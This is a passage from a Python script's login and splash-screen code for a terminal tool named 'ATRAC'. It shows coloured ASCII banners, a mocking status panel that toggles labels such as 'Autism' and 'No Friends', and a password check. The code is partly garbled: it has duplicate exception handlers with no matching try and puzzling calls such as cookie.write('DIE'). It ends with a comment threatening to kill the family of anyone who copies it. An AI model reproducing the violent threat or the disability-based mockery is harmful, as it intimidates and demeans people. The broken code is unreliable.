			os.system (clear)

			print ("\033[34m[+] Skid Shit Granted.")
			print ("\033[34m[+] Type Help To See Commands for ATRAC ;).")
			print (" 									")
			print (" 									")
			print (" 									")
			print (" 									")
			print ("\033[35m                    ╔═════════════════════════════════════╗\033[35m")
			print ("\033[35m                    ║            \033[0;34mATRAC INFO\033[0;34m               \033[35m║\033[35m")
			print ("\033[35m                    ║═════════════════════════════════════║\033[35m")
			print ("\033[35m                    ║  \033[0;34m Autism\033[0;34m        \033[35m----->\033[35m \033[0;31m[DISABLED]\033[0;31m   \033[35m║\033[35m")
			print ("\033[35m                    ║  \033[0;34m Social Reject\033[0;34m \033[35m----->\033[35m \033[0;31m[DISABLED]\033[0;31m   \033[35m║\033[35m")
			print ("\033[35m                    ║  \033[0;34m MV's Love\033[0;34m     \033[35m----->\033[35m \033[0;31m[DISABLED]\033[0;31m   \033[35m║\033[35m")
			print ("\033[35m                    ║   \033[0;34mDigital Ocean\033[0;34m \033[35m----->\033[35m \033[0;31m[DISABLED]\033[0;31m   \033[35m║\033[35m")
			print ("\033[35m                    ║   \033[0;34mReal API\033[0;34m      \033[35m----->\033[35m \033[0;31m[DISABLED]\033[0;31m   \033[35m║\033[35m")
			print ("\033[35m                    ║   \033[0;34mNo Friends\033[0;34m    \033[35m----->\033[35m \033[0;31m[DISABLED]\033[0;31m   \033[35m║\033[35m")
			print ("\033[35m                    ╚═════════════════════════════════════╝\033[35m")
			print ("                                                                       ")									
			print ("                                                                        ")
									                               
			cookie.write("DIE")
			time.sleep(2)
			os.system (clear)
			print ("\033[34m[+] Skid Shit Granted.")
			print ("\033[34m[+] Type Help To See Commands for ATRAC ;).")
			print (" 									")
			print (" 									")
			print (" 									")
			print (" 									")
			print (" 									")
			print (" 									")
			print ("\033[35m                    ╔═════════════════════════════════════╗\033[35m")
			print ("\033[35m                    ║            \033[0;34mATRAC INFO\033[0;34m               \033[35m║\033[35m")
			print ("\033[35m                    ║═════════════════════════════════════║\033[35m")
			print ("\033[35m                    ║  \033[0;34m Autism\033[0;34m        \033[35m----->\033[35m \033[0;32m[ENABLED]\033[0;32m    \033[35m║\033[35m")
			print ("\033[35m                    ║  \033[0;34m Social Reject\033[0;34m \033[35m----->\033[35m \033[0;31m[DISABLED]\033[0;31m   \033[35m║\033[35m")
			print ("\033[35m                    ║  \033[0;34m MV's Love\033[0;34m     \033[35m----->\033[35m \033[0;31m[DISABLED]\033[0;31m   \033[35m║\033[35m")
			print ("\033[35m                    ║   \033[0;34mDigital Ocean\033[0;34m \033[35m----->\033[35m \033[0;31m[DISABLED]\033[0;31m   \033[35m║\033[35m")
			print ("\033[35m                    ║   \033[0;34mReal API\033[0;34m      \033[35m----->\033[35m \033[0;31m[DISABLED]\033[0;31m   \033[35m║\033[35m")
			print ("\033[35m                    ║   \033[0;34mNo Friends\033[0;34m    \033[35m----->\033[35m \033[0;31m[DISABLED]\033[0;31m   \033[35m║\033[35m")
			print ("\033[35m                    ╚═════════════════════════════════════╝\033[35m")
			print (" 									")
			print (" 									")

			cookie.write("DIE")
			time.sleep(1)
			os.system (clear)
			print ("\033[34m[+] Skid Shit Granted.")
			print ("\033[34m[+] Type Help To See Commands for ATRAC ;).")
			print (" 									")
			print (" 									")
			print (" 									")
			print (" 									")
			print (" 									")
			print (" 									")
			print ("\033[35m                    ╔═════════════════════════════════════╗\033[35m")
			print ("\033[35m                    ║            \033[0;34mATRAC INFO\033[0;34m               \033[35m║\033[35m")
			print ("\033[35m                    ║═════════════════════════════════════║\033[35m")
			print ("\033[35m                    ║  \033[0;34m Autism\033[0;34m        \033[35m----->\033[35m \033[0;32m[ENABLED]\033[0;32m    \033[35m║\033[35m")
			print ("\033[35m                    ║  \033[0;34m Social Reject\033[0;34m \033[35m----->\033[35m \033[0;32m[ENABLED]\033[0;32m    \033[35m║\033[35m")
			print ("\033[35m                    ║  \033[0;34m MV's Love\033[0;34m     \033[35m----->\033[35m \033[0;31m[DISABLED]\033[0;31m   \033[35m║\033[35m")
			print ("\033[35m                    ║   \033[0;34mDigital Ocean\033[0;34m \033[35m----->\033[35m \033[0;31m[DISABLED]\033[0;31m   \033[35m║\033[35m")
			print ("\033[35m                    ║   \033[0;34mReal API\033[0;34m      \033[35m----->\033[35m \033[0;31m[DISABLED]\033[0;31m   \033[35m║\033[35m")
			print ("\033[35m                    ║   \033[0;34mNo Friends\033[0;34m    \033[35m----->\033[35m \033[0;31m[DISABLED]\033[0;31m   \033[35m║\033[35m")
			print ("\033[35m                    ╚═════════════════════════════════════╝\033[35m")
			print (" 									")
			print (" 									")

			cookie.write("DIE")
			time.sleep(1)
			os.system (clear)
			print ("\033[34m[+] Skid Shit Granted.")
			print ("\033[34m[+] Type Help To See Commands for ATRAC ;).")
			print (" 									")
			print (" 									")
			print (" 									")
			print (" 									")
			print (" 									")
			print (" 									")
			print ("\033[35m                    ╔═════════════════════════════════════╗\033[35m")
			print ("\033[35m                    ║            \033[0;34mATRAC INFO\033[0;34m               \033[35m║\033[35m")
			print ("\033[35m                    ║═════════════════════════════════════║\033[35m")
			print ("\033[35m                    ║  \033[0;34m Autism\033[0;34m        \033[35m----->\033[35m \033[0;32m[ENABLED]\033[0;32m    \033[35m║\033[35m")
			print ("\033[35m                    ║  \033[0;34m Social Reject\033[0;34m \033[35m----->\033[35m \033[0;32m[ENABLED]\033[0;32m    \033[35m║\033[35m")
			print ("\033[35m                    ║  \033[0;34m MV's Love\033[0;34m     \033[35m----->\033[35m \033[0;32m[ENABLED]\033[0;32m    \033[35m║\033[35m")
			print ("\033[35m                    ║   \033[0;34mDigital Ocean\033[0;34m \033[35m----->\033[35m \033[0;31m[DISABLED]\033[0;31m   \033[35m║\033[35m")
			print ("\033[35m                    ║   \033[0;34mReal API\033[0;34m      \033[35m----->\033[35m \033[0;31m[DISABLED]\033[0;31m   \033[35m║\033[35m")
			print ("\033[35m                    ║   \033[0;34mNo Friends\033[0;34m    \033[35m----->\033[35m \033[0;31m[DISABLED]\033[0;31m   \033[35m║\033[35m")
			print ("\033[35m                    ╚═════════════════════════════════════╝\033[35m")
			print (" 									")
			print (" 									")
	
			cookie.write("DIE")
			time.sleep(1)
			os.system (clear)
			print ("\033[34m[+] Skid Shit Granted.")
			print ("\033[34m[+] Type Help To See Commands for ATRAC ;).")
			print (" 									")
			print (" 									")
			print (" 									")
			print (" 									")
			print (" 									")
			print (" 									")
			print ("\033[35m                    ╔═════════════════════════════════════╗\033[35m")
			print ("\033[35m                    ║            \033[0;34mATRAC INFO\033[0;34m               \033[35m║\033[35m")
			print ("\033[35m                    ║═════════════════════════════════════║\033[35m")
			print ("\033[35m                    ║  \033[0;34m Autism\033[0;34m        \033[35m----->\033[35m \033[0;32m[ENABLED]\033[0;32m    \033[35m║\033[35m")
			print ("\033[35m                    ║  \033[0;34m Social Reject\033[0;34m \033[35m----->\033[35m \033[0;32m[ENABLED]\033[0;32m    \033[35m║\033[35m")
			print ("\033[35m                    ║  \033[0;34m MV's Love\033[0;34m     \033[35m----->\033[35m \033[0;32m[ENABLED]\033[0;32m    \033[35m║\033[35m")
			print ("\033[35m                    ║   \033[0;34mDigital Ocean\033[0;34m \033[35m----->\033[35m \033[0;32m[ENABLED]\033[0;32m    \033[35m║\033[35m")
			print ("\033[35m                    ║   \033[0;34mReal API\033[0;34m      \033[35m----->\033[35m \033[0;31m[DISABLED]\033[0;31m   \033[35m║\033[35m")
			print ("\033[35m                    ║   \033[0;34mNo Friends\033[0;34m    \033[35m----->\033[35m \033[0;31m[DISABLED]\033[0;31m   \033[35m║\033[35m")
			print ("\033[35m                    ╚═════════════════════════════════════╝\033[35m")
			print (" 									")
			print (" 									")

			cookie.write("DIE")
			time.sleep(1)
			os.system (clear)
			print ("\033[34m[+] Skid Shit Granted.")
			print ("\033[34m[+] Type Help To See Commands for ATRAC ;).")
			print (" 									")
			print (" 									")
			print (" 									")
			print (" 									")
			print (" 									")
			print (" 									")
			print ("\033[35m                    ╔═════════════════════════════════════╗\033[35m")
			print ("\033[35m                    ║            \033[0;34mATRAC INFO\033[0;34m               \033[35m║\033[35m")
			print ("\033[35m                    ║═════════════════════════════════════║\033[35m")
			print ("\033[35m                    ║  \033[0;34m Autism\033[0;34m        \033[35m----->\033[35m \033[0;32m[ENABLED]\033[0;32m    \033[35m║\033[35m")
			print ("\033[35m                    ║  \033[0;34m Social Reject\033[0;34m \033[35m----->\033[35m \033[0;32m[ENABLED]\033[0;32m    \033[35m║\033[35m")
			print ("\033[35m                    ║  \033[0;34m MV's Love\033[0;34m     \033[35m----->\033[35m \033[0;32m[ENABLED]\033[0;32m    \033[35m║\033[35m")
			print ("\033[35m                    ║   \033[0;34mDigital Ocean\033[0;34m \033[35m----->\033[35m \033[0;32m[ENABLED]\033[0;32m    \033[35m║\033[35m")
			print ("\033[35m                    ║   \033[0;34mReal API\033[0;34m      \033[35m----->\033[35m \033[0;32m[ENABLED]\033[0;32m    \033[35m║\033[35m")
			print ("\033[35m                    ║   \033[0;34mNo Friends\033[0;34m    \033[35m----->\033[35m \033[0;31m[DISABLED]\033[0;31m   \033[35m║\033[35m")
			print ("\033[35m                    ╚═════════════════════════════════════╝\033[35m")
			print (" 									")
			print (" 									")

			cookie.write("DIE")
			time.sleep(1)
			os.system (clear)
			print ("\033[34m[+] Skid Shit Granted.")
			print ("\033[34m[+] Type Help To See Commands for ATRAC ;).")
			print (" 									")
			print (" 									")
			print (" 									")
			print (" 									")
			print (" 									")
			print (" 									")
			print ("\033[35m                    ╔═════════════════════════════════════╗\033[35m")
			print ("\033[35m                    ║            \033[0;34mATRAC INFO\033[0;34m               \033[35m║\033[35m")
			print ("\033[35m                    ║═════════════════════════════════════║\033[35m")
			print ("\033[35m                    ║  \033[0;34m Autism\033[0;34m        \033[35m----->\033[35m \033[0;32m[ENABLED]\033[0;32m    \033[35m║\033[35m")
			print ("\033[35m                    ║  \033[0;34m Social Reject\033[0;34m \033[35m----->\033[35m \033[0;32m[ENABLED]\033[0;32m    \033[35m║\033[35m")
			print ("\033[35m                    ║  \033[0;34m MV's Love\033[0;34m     \033[35m----->\033[35m \033[0;32m[ENABLED]\033[0;32m    \033[35m║\033[35m")
			print ("\033[35m                    ║   \033[0;34mDigital Ocean\033[0;34m \033[35m----->\033[35m \033[0;32m[ENABLED]\033[0;32m    \033[35m║\033[35m")
			print ("\033[35m                    ║   \033[0;34mReal API\033[0;34m      \033[35m----->\033[35m \033[0;32m[ENABLED]\033[0;32m    \033[35m║\033[35m")
			print ("\033[35m                    ║   \033[0;34mNo Friends\033[0;34m    \033[35m----->\033[35m \033[0;32m[ENABLED]\033[0;32m    \033[35m║\033[35m")
			print ("\033[35m                    ╚═════════════════════════════════════╝\033[35m")
			print (" 									")
			print (" 									")

			cookie.write("DIE")
			time.sleep(1)
			os.system (clear)
			
			print ("\033[34m[+] Skid Shit Granted.")
			print ("\033[34m[+] Type Help To See Commands for ATRAC ;).")
			print (" 									")
			print (" 									")
			print (" 									")
			print (" 									")
			print (" 									")
			print (" 									")
			print ("\033[35m                    ╔═════════════════════════════════════╗\033[35m")
			print ("\033[35m                    ║            \033[0;34mATRAC INFO\033[0;34m               \033[35m║\033[35m")
			print ("\033[35m                    ║═════════════════════════════════════║\033[35m")
			print ("\033[35m                    ║  \033[0;34m Autism\033[0;34m        -----> \033[0;32m[ENABLED]\033[0;32m    \033[35m║\033[35m")
			print ("\033[35m                    ║  \033[0;34m Social Reject\033[0;34m \033[35m----->\033[35m \033[0;32m[ENABLED]\033[0;32m    \033[35m║\033[35m")
			print ("\033[35m                    ║  \033[0;34m MV's Love\033[0;34m     -----> \033[0;32m[ENABLED]\033[0;32m    \033[35m║\033[35m")
			print ("\033[35m                    ║   \033[0;34mDigital Ocean\033[0;34m \033[35m----->\033[35m \033[0;32m[ENABLED]\033[0;32m    \033[35m║\033[35m")
			print ("\033[35m                    ║   \033[0;34mReal API\033[0;34m      -----> \033[0;32m[ENABLED]\033[0;32m    \033[35m║\033[35m")
			print ("\033[35m                    ║   \033[0;34mNo Friends\033[0;34m    \033[35m----->\033[35m \033[0;32m[ENABLED]\033[0;32m    \033[35m║\033[35m")
			print ("\033[35m                    ╚═════════════════════════════════════╝\033[35m")
			print (" 									")
			print (" 									")

			cookie.write("DIE")
			time.sleep(1)
			os.system (clear)
			print ("\033[34m[+] Skid Shit Granted.")
			print ("\033[34m[+] Type Help To See Commands for ATRAC ;).				")
			print (" 									")
			print ("\033[34m     * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * ")                                                                        
			print (" 									")
			print ("\033[34m                                  Made By MVBH3                         ")
			print ("                                                                        ")
			print ("                                                                        ")
			print ("                                                                        ")                                                                       			
			print ("\033[35m	  ██╗    ██╗███████╗██╗      ██████╗ ██████╗ ███╗   ███╗███████╗")
			print ("\033[35m	  ██║    ██║██╔════╝██║     ██╔════╝██╔═══██╗████╗ ████║██╔════╝")
			print ("\033[35m	  ██║ █╗ ██║█████╗  ██║     ██║     ██║   ██║██╔████╔██║█████╗  ")
			print ("\033[35m	  ██║███╗██║██╔══╝  ██║     ██║     ██║   ██║██║╚██╔╝██║██╔══╝  ")
			print ("\033[35m	  ╚███╔███╔╝███████╗███████╗╚██████╗╚██████╔╝██║ ╚═╝ ██║███████╗")
			print ("\033[35m	   ╚══╝╚══╝ ╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚══════╝")
                                                              

		       
			cookie.write("DIE")
			time.sleep(1)
			os.system (clear)
			print ("\033[34m[+] Skid Shit Granted.")
			print ("\033[34m[+] Type Help To See Commands for ATRAC ;).				")
			print (" 									")
			print ("\033[34m     * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * ")                                                                        
			print (" 									")
			print ("\033[34m                                  Made By MVBH3                         ")
			print ("                                                                        ")
			print ("                                                                        ")
			print ("                                                                        ")                                                                       			
			print ("	  								")
			print ("	  								")
			print ("\033[35m	 		        ████████╗ ██████╗ 						")
			print ("\033[35m	 		 	╚══██╔══╝██╔═══██╗						")
			print ("\033[35m   	    		   	   ██║   ██║   ██║						")
			print ("\033[35m   	    		   	   ██║   ██║   ██║						")
			print ("\033[35m   	    		   	   ██║   ╚██████╔╝						")
			print ("\033[35m   	     		   	   ╚═╝    ╚═════╝ 						")
                  
			cookie.write("DIE")
			time.sleep(1)
			os.system (clear)

			try:
				os.system ("clear")
				print (banner)
				main()
			except KeyboardInterrupt:
				print ("\n[\033[34mSkid\033[34m] Ctrl-C, Dont Leave Too Soon ;) Remember We are ALL Apart of ATRAC.\n")
				print ("  ================\ ")
				print ("  |----------||@  \\   ___")
				print ("  |____|_____|||_/_\\_|___|_")
				print (" <|  ___\    ||     | ____  |")
				print (" <| /    |___||_____|/    | |")
				print (" ||/  O  |__________/  O  |_||")
				print ("    \___/ DRIVE SAVE \___/ ")
				print ("                           ")
				main()
				time.sleep(2)
				os.system ("clear")
				print (banner)
			
				os.system ("clear")
				print (banner)
				main()
			except KeyboardInterrupt:
				print ("\n[\033[34mSkid\033[34m] Ctrl-C, Dont Leave Too Soon ;) Remember We are ALL Apart of ATRAC.\n")
				print ("      ================\ ")
				print ("      |----------||@  \\   ___")
				print ("      |____|_____|||_/_\\_|___|_")
				print ("     <|  ___\    ||     | ____  |")
				print ("     <| /    |___||_____|/    | |")
				print ("     ||/  O  |__________/  O  |_||")
				print ("        \___/ DRIVE SAVE \___/ ")
				print ("                               ")
				main()
				time.sleep(2)
				os.system ("clear")
				print (banner)
				main()
			
		else:
			print ("[+] Incorrect, Try Again Next Time Skid ;).\n")
			print (" 									")
			print (" \033[34m    * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * ")                                                                        
			print (" 									")
			print (" \033[34m                                 Made By MVBH3                         ")
			print ("                                                                        ")
			print ("                                                                        ")
			print ("                                                                        ")
			print ("\033[35m		██╗███╗   ██╗██╗   ██╗ █████╗ ██╗     ██╗██████╗        ")
			print ("\033[35m		██║████╗  ██║██║   ██║██╔══██╗██║     ██║██╔══██╗       ")
			print ("\033[35m		██║██╔██╗ ██║██║   ██║███████║██║     ██║██║  ██║       ")
			print ("\033[35m		██║██║╚██╗██║╚██╗ ██╔╝██╔══██║██║     ██║██║  ██║       ")
			print ("\033[35m		██║██║ ╚████║ ╚████╔╝ ██║  ██║███████╗██║██████╔╝       ")
			print ("\033[35m		╚═╝╚═╝  ╚═══╝  ╚═══╝  ╚═╝  ╚═╝╚══════╝╚═╝╚═════╝        ")
			print (" 									")
			print (" 									")
			print (" 									")
			print (" 									")
			print (" 									")
			exit()
	if user == "ATRAC":
		if password == passwords[1]:
			print ("[+] Skid Shit Granted ;).")
			print ("[+] Certain Methods Will Not Be Available To You.")
			print ("[+] Type Help To See Commands.")
			time.sleep(10)
			os.system (clear)
			try:
				os.system ("clear")
				print (banner)
				main()
			except KeyboardInterrupt:
				print ("\n[\033[34mSkid\033[34m] Ctrl-C, Dont Leave Too Soon ;) Remember We are ALL Apart of ATRAC.\n")
				main()
		else:
			print ("\033[34m[+] Incorrect, Try Again Next Time Skid ;).\n")
			print (" 									")
			print (" \033[34m    * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * ")                                                                        
			print (" 									")
			print (" \033[34m                                 Made By MVBH3                         ")
			print ("                                                                        ")
			print ("                                                                        ")
			print ("                                                                        ")
			print ("\033[35m		██╗███╗   ██╗██╗   ██╗ █████╗ ██╗     ██╗██████╗        ")
			print ("\033[35m		██║████╗  ██║██║   ██║██╔══██╗██║     ██║██╔══██╗       ")
			print ("\033[35m		██║██╔██╗ ██║██║   ██║███████║██║     ██║██║  ██║       ")
			print ("\033[35m		██║██║╚██╗██║╚██╗ ██╔╝██╔══██║██║     ██║██║  ██║       ")
			print ("\033[35m		██║██║ ╚████║ ╚████╔╝ ██║  ██║███████╗██║██████╔╝       ")
			print ("\033[35m		╚═╝╚═╝  ╚═══╝  ╚═══╝  ╚═╝  ╚═╝╚══════╝╚═╝╚═════╝        ")
			print (" 									")
			print (" 									")
			print (" 									")
			print (" 									")
			print (" 									")                                
			exit()
except KeyboardInterrupt:
	exit()

# What you doing in my code??
# Stay Safe Cutie 


# 88MM:::::8888M:::::::88::::::::8:::::888888:::M:::::M
#    8888M:::::888MM::::::::8:::::::::::M::::8888::::M::::M
#    88888M:::::88:M::::::::::8:::::::::::M:::8888::::::M::M
#  88 888MM:::888:M:::::::::::::::::::::::M:8888:::::::::M:
#   8 88888M:::88::M:::::::::::::::::::::::MM:88::::::::::::M
#     88888M:::88::M::::::::::*88*::::::::::M:88::::::::::::::M
#    888888M:::88::M:::::::::88@@88:::::::::M::88::::::::::::::M
#    888888MM::88::MM::::::::88@@88:::::::::M:::8::::::::::::::*8
#    88888  M:::8::MM:::::::::*88*::::::::::M:::::::::::::::::88@@
#    8888   MM::::::MM:::::::::::::::::::::MM:::::::::::::::::88@@
#     888    M:::::::MM:::::::::::::::::::MM::M::::::::::::::::*8
#     888    MM:::::::MMM::::::::::::::::MM:::MM:::::::::::::::M
#      88     M::::::::MMMM:::::::::::MMMM:::::MM::::::::::::MM
#       88    MM:::::::::MMMMMMMMMMMMMMM::::::::MMM::::::::MMM
#        88    MM::::::::::::MMMMMMM::::::::::::::MMMMMMMMMM
#         88   8MM::::::::::::::::::::::::::::::::::MMMMMM
#          8   88MM::::::::::::::::::::::M:::M::::::::MM


#SKID THIS SHIT AND ILL KILL YOUR FAMILY, Love MV